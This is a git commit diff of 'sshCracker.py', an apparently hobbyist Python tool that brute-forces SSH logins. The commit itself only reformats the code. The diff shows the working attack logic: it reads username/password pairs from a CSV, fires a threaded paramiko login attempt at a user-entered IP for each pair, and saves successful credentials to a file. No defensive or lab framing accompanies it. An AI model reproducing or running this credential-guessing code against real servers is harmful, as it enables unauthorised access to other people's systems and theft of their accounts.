49382c066f0c54ff8e5ff0ab05889af0384246a9
Will Segale <39059459+WilSegale@users.noreply.github.com>
2023-01-09 10:23:50 -0500

    Update sshCracker.py

--- sshCracker.py
+++ sshCracker.py
@@ -11,8 +11,9 @@ import logging
 import pyfiglet
 import os
 
+
 os.system("clear")
-for i in tqdm(range(10),colour="green", desc="loading software"):
+for i in tqdm(range(10), colour="green", desc="loading software"):
     time.sleep(1.00)
 
 os.system("clear")
@@ -25,17 +26,22 @@ def ssh(host, username, password):
     ssh_client = SSHClient()
     ssh_client.set_missing_host_key_policy(AutoAddPolicy())
     try:
-        ssh_client.connect(host,port=22,username=username, password=password, banner_timeout=300)
+        ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)
+
         with open("credentials_found.txt", "a") as fh:
             print(f"{Fore.GREEN}Username - {username} and Password - ******* found.")
-            fh.write(f"Username: {Fore.GREEN} {username} {Fore.RESET}\nPassword: {Fore.GREEN} {password} {Fore.RESET}\nWorked on host {host}\n")
+            
+            fh.write(f"Username: {Fore.GREEN} {username} {Fore.RESET}\nPassword: {Fore.GREEN} {password} {Fore.RESET}\nWorked on host: {host}\n")
+
     except AuthenticationException:
         with open("Wrong_credentials.txt", "a") as fh:
             print(f"{Fore.RED}Username - {username} and Password - ******* is Incorrect.")
+            
             fh.write(f"Username: {username}\nPassword: {password}\nDidnt work on host {host}\n\n")
 
     except ssh.SSHException:
         print(f"{Fore.RED}**** Attempting to connect - Rate limiting on server ****")
+
 
 def get_ip_address():
     while True:
@@ -46,9 +52,10 @@ def get_ip_address():
         except ipaddress.AddressValueError:
             print("Please enter a valid ip address.")
 
+
 def __main__():
-    logging.getLogger('paramiko.transport').addHandler(NullHandler())
-    list_file="passwords.csv"
+    logging.getLogger("paramiko.transport").addHandler(NullHandler())
+    list_file = "passwords.csv"
     host = get_ip_address()
     with open(list_file) as fh:
         csv_reader = csv.reader(fh, delimiter=",")
@@ -56,9 +63,16 @@ def __main__():
             if index == 0:
                 continue
             else:
-                t = threading.Thread(target=ssh, args=(host, row[0], row[1],))
+                t = threading.Thread(
+                    target=ssh,
+                    args=(
+                        host,
+                        row[0],
+                        row[1],
+                    ),
+                )
                 t.start()
                 time.sleep(0.2)
 
-__main__()
 
+__main__()
